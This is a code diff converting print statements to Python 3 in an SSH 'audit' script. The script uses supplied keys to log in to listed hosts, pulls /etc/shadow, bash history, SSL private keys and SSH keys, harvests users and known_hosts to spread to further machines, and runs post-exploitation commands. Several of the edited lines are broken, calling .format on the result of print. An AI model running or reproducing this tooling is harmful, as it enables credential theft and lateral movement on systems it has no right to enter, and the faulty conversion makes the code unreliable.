@@ -34,7 +34,7 @@ class ssh:
             if self.sudo is True:
                 command = 'sudo ' + command
             else:
-                print '[-] Admin command failed, user is not root and cannot sudo.'
+                print ('[-] Admin command failed, user is not root and cannot sudo.')
                 return None
 
         cmd = 'ssh -i {0} {1}@{2} "{3}"'.format(self.__key,
@@ -64,24 +64,24 @@ class ssh:
         '''
         Download the src file and save it to disk as dst.
         '''
-        print '[*] Downloading {0} from {1}'.format(src, self.__host)
+        print ('[*] Downloading {0} from {1}'.format(src, self.__host))
         resp = self.run_ssh_command('cat {0}'.format(src), admin)
 
         if resp is None:
-            print '[-] Unable to download file'
+            print ('[-] Unable to download file')
             return False
         else:
             dfile = open(dst, 'w')
             dfile.write(resp)
             dfile.close()
-            print '[+] File successfully downloaded.'
+            print ('[+] File successfully downloaded.')
             return True
 
     def get_users(self):
         
         # Read and parse the /etc/passwd file to get new user accounts.
        
-        print '[*] Getting additional users.'
+        print ('[*] Getting additional users.')
         users = []
         resp = self.run_ssh_command('cat /etc/passwd')
         if resp is None:
@@ -96,7 +96,7 @@ class ssh:
         
         # Read and parse the .ssh/known_hosts file to get new hosts.
         
-        print '[*] Getting additional hosts.'
+        print ('[*] Getting additional hosts.')
         hosts = []
         resp = self.run_ssh_command('cat .ssh/known_hosts')
         if resp is None:
@@ -111,7 +111,7 @@ class ssh:
         
         # Get the /etc/shadow file and save it to disk. Will only work if we are root or have sudo ability.
         
-        print '[*] Getting shadow file from {0}.'.format(self.__host)
+        print ('[*] Getting shadow file from {0}.').format(self.__host)
         dst = '{0}_shadow'.format(self.__host)
         self.__download_file('/etc/shadow', dst, True)
 
@@ -119,7 +119,7 @@ class ssh:
         
         # Get the .bash_history file and save it to disk.
         
-        print '[*] Getting Bash history file from {0}.'.format(self.__host)
+        print ('[*] Getting Bash history file from {0}.').format(self.__host)
         dst = '{0}_{1}_history'.format(self.__host, self.__user)
         self.__download_file('.bash_history', dst, True)
 
@@ -127,7 +127,7 @@ class ssh:
         
         # Download any private SSL keys. Look in the directory specified by OPENSSLDIR in the output of the 'openssl version -a' command. only download .crt and .key files. Requires root or sudo.
         
-        print '[*] Getting SSL keys, if any, from {0}'.format(self.__host)
+        print ('[*] Getting SSL keys, if any, from {0}').format(self.__host)
         ssldir = None
         resp = self.run_ssh_command('openssl version -a')
         if resp is not None:
@@ -135,10 +135,10 @@ class ssh:
             if m is not None:
                 ssldir = m.group(1) + '/certs'
             else:
-                print '[-] No SSL directory found.'
+                print ('[-] No SSL directory found.')
 
         if ssldir is not None:
-            print '[+] Searching for SSL keys in {0}.'.format(ssldir)
+            print ('[+] Searching for SSL keys in {0}.').format(ssldir)
             resp = self.run_ssh_command('ls {0}'.format(ssldir), True)
             if resp is not None:
                 for line in resp.split('\n'):
@@ -147,13 +147,13 @@ class ssh:
                         dst = '{0}_{1}'.format(self.__host, line)
                         self.__download_file(src, dst, True)
             else:
-                print '[-] No SSL keys were found.'
+                print ('[-] No SSL keys were found.')
 
     def get_ssh_keys(self):
         
         # Download the SSH keys in the .ssh directory. Return the list of keys found.
         
-        print '[*] Getting additional SSH keys from {0}'.format(self.__host)
+        print ('[*] Getting additional SSH keys from {0}').format(self.__host)
         keys = []
         resp = self.run_ssh_command('ls .ssh')
         for line in resp.split('\n'):
@@ -181,7 +181,7 @@ def audit_ssh(user, key, host):
     SSL private keys. Also add new users and hosts if allowed.
     '''
     
-    print '[*] Auditing {0}@{1} with {2}.'.format(user, host, key)
+    print ('[*] Auditing {0}@{1} with {2}.').format(user, host, key)
     server = ssh(user, key, host)
     if server.authenticated is True:
         keys.extend(server.get_ssh_keys())
@@ -194,7 +194,7 @@ def audit_ssh(user, key, host):
         server.get_ssl_keys()
         run_post_exploitation(server)
     else:
-        print '[-] Unable to login to server.'
+        print ('[-] Unable to login to server.')
 
 
 def add_new_users(new_users):
@@ -208,7 +208,7 @@ def add_new_users(new_users):
             continue
         if user == '':
             continue
-        print '[+] Found new user {0}.'.format(user)
+        print ('[+] Found new user {0}.').format(user)
         users.append(user)
 
 
@@ -221,7 +221,7 @@ def add_new_hosts(new_hosts):
             continue
         if host == '':
             continue
-        print '[+] Found new host {0}.'.format(host)
+        print ('[+] Found new host {0}.').format(host)
         hosts.append(host)
 
 
@@ -231,23 +231,23 @@ def run_post_exploitation(server):
     in the 'postexploit' file. Failed commands are attempted with sudo if the
     user is not root.
     '''
-    print '[*] Running post exploitation commands.'
+    print ('[*] Running post exploitation commands.')
     pe = open('postexploit', 'w')
     for cmd in post_exploit:
-        print '[*] Running command {0}.'.format(cmd)
+        print ('[*] Running command {0}.').format(cmd)
         pe.write(cmd + '\n')
         resp = server.run_ssh_command(cmd)
         if resp is None:
-            print '[-] Command failed trying with sudo.'
+            print ('[-] Command failed trying with sudo.')
             resp = server.run_ssh_command(cmd, True)
             if resp is not None:
-                print '[+] Command successful.'
+                print ('[+] Command successful.')
                 pe.write(resp + '\n')
             else:
-                print '[-] Command unsuccessful.'
+                print ('[-] Command unsuccessful.')
                 pe.write('\n')
         else:
-            print '[+] Command successful.'
+            print ('[+] Command successful.')
             pe.write(resp + '\n')
 
     pe.close()
@@ -258,7 +258,7 @@ def load_keys():
     Load SSH keys from the current directory.
     '''
     keys = []
-    print '[*] Loading SSH keys from current directory.'
+    print ('[*] Loading SSH keys from current directory.')
     for file in os.listdir('.'):
         if file.endswith('.pub'):
             continue
@@ -286,7 +286,7 @@ def load_users():
     Load user accounts from the 'users' file.
     '''
     u = []
-    print '[*] Loading user accounts.'
+    print ('[*] Loading user accounts.')
     for line in open('users', 'r'):
         if line == '\n':
             continue
@@ -299,7 +299,7 @@ def save_users():
     '''
     Update the 'users' file with the newly discovered users if allowed.
     '''
-    print '[*] Saving user accounts.'
+    print ('[*] Saving user accounts.')
     u = open('users', 'w')
     u.write('\n'.join(users))
     u.close()
@@ -310,7 +310,7 @@ def load_hosts():
     Load hostnames/IPs from the 'hosts' file.
     '''
     h = []
-    print '[*] Loading hosts.'
+    print ('[*] Loading hosts.')
     for line in open('hosts', 'r'):
         if line == '\n':
             continue
@@ -323,7 +323,7 @@ def save_hosts():
     '''
     Update the 'hosts' file with newly discovered hosts, if allowed.
     '''
-    print '[*] Saving hosts.'
+    print ('[*] Saving hosts.')
     h = open('hosts', 'w')
     h.write('\n'.join(hosts))
     h.close()
@@ -353,7 +353,7 @@ if __name__ == '__main__':
     hosts = load_hosts()
     keys = load_keys()
 
-    print '[*] Starting SSH audit.'
+    print ('[*] Starting SSH audit.')
     for key in keys:
         for user in users:
             for host in hosts:
